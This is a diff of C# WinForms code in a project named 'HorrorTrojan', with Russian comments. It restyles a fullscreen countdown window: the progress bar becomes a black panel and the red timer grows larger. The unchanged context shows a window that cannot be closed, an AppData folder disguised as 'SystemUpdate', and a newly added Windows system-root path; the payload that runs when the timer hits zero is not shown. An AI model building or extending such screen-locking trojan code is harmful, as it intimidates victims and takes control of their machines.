@@ -50,11 +50,12 @@ namespace HorrorTrojan
         private Random rnd = new Random();
         private PictureBox pictureBox;
         private Label timerLabel;
-        private ProgressBar progressBar;
+        private Panel bottomPanel; // ЧЕРНАЯ ПАНЕЛЬ ВМЕСТО ПРОГРЕССА
         private Image gifImage;
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private SoundPlayer musicPlayer;
+        private string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows"; // ДОБАВИЛИ
 
         public MainInterface()
         {
@@ -70,7 +71,7 @@ namespace HorrorTrojan
         {
             this.pictureBox = new PictureBox();
             this.timerLabel = new Label();
-            this.progressBar = new ProgressBar();
+            this.bottomPanel = new Panel(); // ВМЕСТО ProgressBar
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).BeginInit();
             this.SuspendLayout();
 
@@ -84,30 +85,32 @@ namespace HorrorTrojan
             this.ControlBox = false;
             this.KeyPreview = false;
 
+            // PictureBox (GIF)
             this.pictureBox.Dock = DockStyle.Top;
             this.pictureBox.Size = new Size(448, 448);
             this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
             this.pictureBox.BackColor = Color.Black;
 
+            // ЧЕРНАЯ ПАНЕЛЬ (вместо прогресса)
+            this.bottomPanel.Dock = DockStyle.Bottom;
+            this.bottomPanel.Height = 72;
+            this.bottomPanel.BackColor = Color.Black;
+
+            // Таймер (на черной панели)
             this.timerLabel.AutoSize = false;
             this.timerLabel.Dock = DockStyle.Fill;
             this.timerLabel.TextAlign = ContentAlignment.MiddleCenter;
             this.timerLabel.ForeColor = Color.Red;
             this.timerLabel.BackColor = Color.Black;
-            this.timerLabel.Font = new Font("Consolas", 24, FontStyle.Bold);
+            this.timerLabel.Font = new Font("Consolas", 48, FontStyle.Bold);
             this.timerLabel.Text = "5:00";
 
-            this.progressBar.Dock = DockStyle.Bottom;
-            this.progressBar.Height = 10;
-            this.progressBar.ForeColor = Color.Red;
-            this.progressBar.BackColor = Color.Black;
-            this.progressBar.Style = ProgressBarStyle.Continuous;
-            this.progressBar.Maximum = 300;
-            this.progressBar.Value = 300;
+            // Добавляем таймер на панель
+            this.bottomPanel.Controls.Add(this.timerLabel);
 
-            this.Controls.Add(this.timerLabel);
+            // Добавляем все на форму
             this.Controls.Add(this.pictureBox);
-            this.Controls.Add(this.progressBar);
+            this.Controls.Add(this.bottomPanel);
 
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
             this.ResumeLayout(false);
@@ -116,8 +119,7 @@ namespace HorrorTrojan
         private void SetupForm()
         {
             this.FormClosing += (s, e) => e.Cancel = true;
-            this.Cursor = Cursors.Default;
-            Cursor.Hide();
+            // КУРСОР НЕ СКРЫВАЕМ (это не LogonUI)
         }
 
         private void LoadResources()
@@ -183,7 +185,6 @@ namespace HorrorTrojan
             int minutes = timeLeft / 60;
             int seconds = timeLeft % 60;
             timerLabel.Text = $"{minutes}:{seconds:D2}";
-            progressBar.Value = timeLeft;
 
             if (timeLeft == 0)
             {
